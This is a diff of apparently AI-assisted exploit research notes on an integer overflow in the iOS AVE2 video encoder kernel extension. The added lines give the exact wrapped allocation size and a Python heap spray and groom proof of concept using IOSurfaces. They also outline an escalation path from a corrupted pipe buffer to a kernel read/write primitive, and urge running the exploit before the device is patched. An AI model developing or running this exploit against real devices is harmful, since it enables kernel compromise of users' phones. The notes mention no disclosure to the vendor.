@@ -498,20 +498,52 @@ Full analysis in STATE.md. Requires kernel exec as precondition.
 
 ## Next Steps (priority order)
 
-**← RESUME HERE → (fresh Claude session first — conversation context drives memory up ~500 MB)**
+**← RESUME HERE → Device was rebooted at end of 2026-11-03 session to clear stuck AVE2 firmware.**
 
-0. **Surface E — AVE2 NTL=2057 dynamic probe (WAITING on firmware clear)**
+**CRITICAL WARNING:** 27.0.1 added `AVE_Entitlement_Check`. If Apple backports this gate to a 26.6.x point release, the NTL path becomes sandbox-inaccessible. Run the groom PoC before any iOS update.
 
-   Job 824760D3 has NTL=1 blocked on firmware backlog from prior NTL=2056 stall. Memory at 1849 MB.
-   Once NTL=1 completes, next job should test NTL=2057 (first real overflow). Expected outcomes:
-   - **Hard crash** (most likely): ~2 MB allocation → OOB write → kernel memory fault → jetsam / panic
-   - **ntl_rejected**: kext checks NTL before DPB allocation (would mean it's patched differently)
-   - **Completion**: overflow happened but no OOB damage on this encode → try multi-frame encode
+0. **Surface E — AVE2 heap spray/groom PoC (READY TO WRITE AND RUN)**
 
-   If crash: read `/Library/Logs/CrashReporter/` (from Mac terminal tool) for ExceptionType — `EXC_BAD_ACCESS` confirms OOB write; `jetsam` is OOM.
-   Check AppGroup log for which NTL entry has STARTING but no result.
+   **What we know (2026-11-03 static analysis):**
+   - DPB is IOSurface-backed kernel memory (not firmware-private) — OOB write is kernel-visible ✓
+   - NTL=2057 is the first TRUE overflow: wraps DPB allocation to exactly **2,023,424 bytes (~1.93 MB)**
+   - 27.0.1 patches: `iLayerNum <= 2` cap + new `AVE_CalcBufSizeOfDPB` wrapper + `AVE_Entitlement_Check`
+   - `AVE_CalcBufSizeOfRecon` in 26.6.1 has zero overflow checking
 
-   **DO NOT run probe at memory ≥ 1500 MB** — system is too close to OOM ceiling.
+   **Firmware stall lesson (empirically discovered 2026-11-03):**
+   - NTL 501–2056 request 1–4.29 GB DPB without overflowing 32-bit → firmware stalls 15+ min each
+   - NTL=2057 wraps to ~2 MB → completely different regime (fast crash expected)
+   - AVE2 firmware runs on media coprocessor independent of iOS process lifecycle
+   - Force-quitting RH does NOT reset firmware — need device reboot to clear a stuck encode
+   - **Always start probes on fresh-rebooted device**
+
+   **Concrete heap groom plan:**
+   ```python
+   # 1. Spray: allocate 64 IOSurfaces at exactly the DPB overflow size
+   GROOM_SIZE = 2_023_424  # DPB_unit * 2057 wrapped = (2088960 * 2057) & 0xFFFFFFFF
+   surfs = [IOSurfaceCreate({'IOSurfaceAllocSize': GROOM_SIZE}) for _ in range(64)]
+   
+   # 2. Create holes: free every other one
+   for i in range(0, 64, 2):
+       IOSurfaceRelease(surfs[i])
+       surfs[i] = None
+   
+   # 3. Trigger: run NTL=2057 encode → DPB lands in one of the holes
+   probe_ntl(2057)
+   
+   # 4. Scan: check all surviving IOSurfaces for corrupted alloc size
+   for surf in surfs:
+       if surf and IOSurfaceGetAllocSize(surf) != GROOM_SIZE:
+           print("KERNEL WRITE CONFIRMED", hex(IOSurfaceGetAllocSize(surf)))
+   ```
+   - `IOSurfaceCreate` is sandbox-accessible (confirmed earlier sessions)
+   - `IOSurfaceGetAllocSize()` reads kernel header → corrupted value = confirmed kernel write
+   - Escalation path: replace victim with pipe buffer → corrupt `buf_size` → kernel R/W primitive
+
+   **PoC file:** `kerneldiff/ave2_overflow_poc.py` (v4, ladder: [1, 100, 500, 2057, 2100, 2200, 2500])
+   **Next file to write:** `kerneldiff/ave2_groom_poc.py` — spray + groom + NTL=2057 + IOSurface scan
+
+   **Run conditions:** fresh reboot, memory < 1400 MB baseline before starting
 
 1. **Surface C MIG probe (AURemoteIOServer)** — attack model corrected 2026-11-01:
 
